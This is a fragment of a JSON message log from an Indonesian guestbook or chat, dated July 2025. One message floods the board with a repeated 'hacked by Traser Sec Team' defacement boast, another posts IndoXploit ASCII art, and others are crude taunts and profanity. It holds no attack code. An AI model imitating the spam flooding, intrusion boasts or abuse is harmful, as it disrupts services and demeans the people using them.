        "pesan": "[!] R00T~INDOXPLOIT[!]\r\nDI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf",
        "waktu": "2025-07-23 12:32:43",
        "is_admin": false
    },
    {
        "nama": "<SUKA RESTI01>",
        "pesan": "___________________________ < root@indoxploit:~# w00t??? >  ---------------------------    \\         ,        ,     \\       \/(        )`      \\      \\ \\___   \/ |             \/- _  `-\/  '            (\/\\\/ \\ \\   \/\\            \/ \/   | `    \\            O O   ) \/    |            `-^--'`<     '           (_.)  _  )   \/            `.___\/`    \/              `-----' \/ <----.     __ \/ __   \\ <----|====O)))==) \\) \/==== <----'    `--' `.__,' \\              |        |               \\       \/         ______( (_  \/ \\______       ,'  ,-----'   |        \\       `--{__________)        \\\/",
        "waktu": "2025-07-23 12:47:16",
        "is_admin": false
    },
    {
        "nama": "Taubat",
        "pesan": "Taubat",
        "waktu": "2025-07-23 23:46:43",
        "is_admin": false
    },
    {
        "nama": "hacked",
        "pesan": "hacker ampas",
        "waktu": "2025-07-25 03:41:05",
        "is_admin": false
    },
    {
        "nama": "BACOTTTT LU SEMUAAA ANJINGGG!!",
        "pesan": "icikiwir",
        "waktu": "2025-07-26 07:41:20",
        "is_admin": false
    }
]